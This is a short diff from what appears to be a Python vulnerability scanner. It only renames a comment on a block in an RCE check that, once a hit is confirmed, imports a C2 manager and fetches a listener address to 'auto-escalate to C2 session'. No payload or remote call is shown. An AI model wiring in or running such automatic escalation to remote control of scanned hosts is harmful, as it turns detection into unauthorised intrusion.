@@ -61,7 +61,7 @@ async def check_rce_dump(session, url):
                                     "remediation": "Sanitize input, use parameterized commands, or disable shell execution."
                                 })
                                 
-                                # [GOD MODE] AUTO-ESCALATE TO C2 SESSION
+                                # [KINETIC STRIKE] AUTO-ESCALATE TO C2 SESSION
                                 try:
                                     from core.c2_manager import c2_manager
                                     lhost = c2_manager.get_lhost_address(url)
